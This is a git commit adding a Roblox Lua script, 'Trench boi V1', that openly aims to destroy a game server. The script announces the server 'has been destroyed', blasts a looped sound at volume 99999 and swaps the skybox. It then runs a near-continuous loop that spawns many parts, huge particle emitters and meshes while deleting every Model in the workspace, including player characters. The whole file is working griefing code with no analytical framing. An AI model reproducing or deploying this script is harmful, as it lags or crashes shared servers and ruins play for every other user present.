348aff9adddf5d7e7c8ac19219e7d65f288c7a45
miskle <75860411+miskle@users.noreply.github.com>
2021-01-17 19:06:50 -0500

    Create trench-boi.lua

---
+++ trench-boi.lua
@@ -0,0 +1,159 @@
+msg2 = Instance.new("Message",workspace)
+msg2.Text = "Trench boi V1 by himoresore"
+wait(4)
+msg2:Destroy()
+local bsize = 10000
+local lmaooo = "rbxassetid://167610895"
+local s = Instance.new("Sound",workspace)
+s.SoundId = "rbxassetid://5988862207"
+s.Looped = true
+s.Volume = 99999
+s.TimePosition = 7.1
+wait(3)
+s:Play()
+msg = Instance.new("Message",workspace)
+msg.Text = "this server has been destroyed by gangster toad."
+local Sky = Instance.new("Sky",game.Lighting) 
+Sky.SkyboxBk = lmaooo
+Sky.SkyboxDn = lmaooo
+Sky.SkyboxFt = lmaooo
+Sky.SkyboxLf = lmaooo
+Sky.SkyboxRt = lmaooo
+Sky.SkyboxUp = lmaooo
+rain = coroutine.create(function()
+	while wait(0.0001) do
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,60),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,60),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,60),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		skyPiece.Reflectance = 1
+		local skyPiece = Instance.new("Part",workspace)
+		skyPiece.CanCollide = true
+		skyPiece.Position = Vector3.new(math.random(-3000,3000),math.random(-3000,3000),math.random(-3000,3000))
+		skyPiece.Size = Vector3.new(math.random(40,50),5,math.random(40,60))
+		local ugh = Instance.new("Part",workspace)
+		ugh.Anchored = true
+		ugh.Position = Vector3.new(math.random(-1000,1000),0,math.random(-1000,1000))
+		
+		local NO = Instance.new("ParticleEmitter")  
+		NO.Parent = ugh
+		NO.Texture = lmaooo
+		NO.Speed = NumberRange.new(200) 
+		NO.Rate = 200
+		NO.Lifetime = NumberRange.new(1000) 
+		NO.Size = NumberSequence.new(bsize,bsize)
+		
+		local ugh = Instance.new("Part",workspace)
+		ugh.Anchored = true
+		ugh.Position = Vector3.new(math.random(-1000,1000),0,math.random(-1000,1000))
+		
+		local NO = Instance.new("ParticleEmitter")  
+		NO.Parent = ugh
+		NO.Texture = lmaooo
+		NO.Speed = NumberRange.new(200) 
+		NO.Rate = 200
+		NO.Lifetime = NumberRange.new(1000) 
+		NO.Size = NumberSequence.new(bsize,bsize)
+		
+		local ugh = Instance.new("Part",workspace)
+		ugh.Anchored = true
+		ugh.Position = Vector3.new(math.random(-1000,1000),0,math.random(-1000,1000))
+		
+		local NO = Instance.new("ParticleEmitter")  
+		NO.Parent = ugh
+		NO.Texture = lmaooo
+		NO.Speed = NumberRange.new(200) 
+		NO.Rate = 200
+		NO.Lifetime = NumberRange.new(1000) 
+		NO.Size = NumberSequence.new(bsize,bsize)
+		
+		local ugh = Instance.new("Part",workspace)
+		ugh.Anchored = true
+		ugh.Position = Vector3.new(math.random(-1000,1000),0,math.random(-1000,1000))
+		
+		local NO = Instance.new("ParticleEmitter")  
+		NO.Parent = ugh
+		NO.Texture = lmaooo
+		NO.Speed = NumberRange.new(200) 
+		NO.Rate = 200
+		NO.Lifetime = NumberRange.new(1000) 
+		NO.Size = NumberSequence.new(bsize,bsize)
+		
+		local ugh = Instance.new("Part",workspace)
+		ugh.Anchored = true
+		ugh.Position = Vector3.new(math.random(-1000,1000),0,math.random(-1000,1000))
+		
+		local NO = Instance.new("ParticleEmitter")  
+		NO.Parent = ugh
+		NO.Texture = lmaooo
+		NO.Speed = NumberRange.new(200) 
+		NO.Rate = 200
+		NO.Lifetime = NumberRange.new(1000) 
+		NO.Size = NumberSequence.new(bsize,bsize)
+		
+		part = Instance.new("Part",workspace)
+		part.Name = "rlly"
+		part.CanCollide = false
+		part.Size = Vector3.new(440,530,380)
+		part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
+ 
+		mesh = Instance.new("SpecialMesh",part)
+		mesh.MeshType = "FileMesh"
+		mesh.MeshId = "rbxassetid://430210147"
+		mesh.TextureId = "rbxassetid://430210159"
+		
+		part = Instance.new("Part",workspace)
+		part.Name = "rlly"
+		part.CanCollide = false
+		part.Size = Vector3.new(440,530,380)
+		part.Position = Vector3.new(math.random(-3000,1000),math.random(1,3000),math.random(-3000,3000))
+ 
+		mesh = Instance.new("SpecialMesh",part)
+		mesh.MeshType = "FileMesh"
+		mesh.MeshId = "rbxassetid://430210147"
+		mesh.TextureId = "rbxassetid://430210159"
+		
+		skyPiece.Reflectance = 1
+		for i,v in pairs(workspace:GetChildren()) do
+			if v:IsA("Model") then
+				v:Destroy()
+			end
+		end
+	end
+end)
+coroutine.resume(rain)
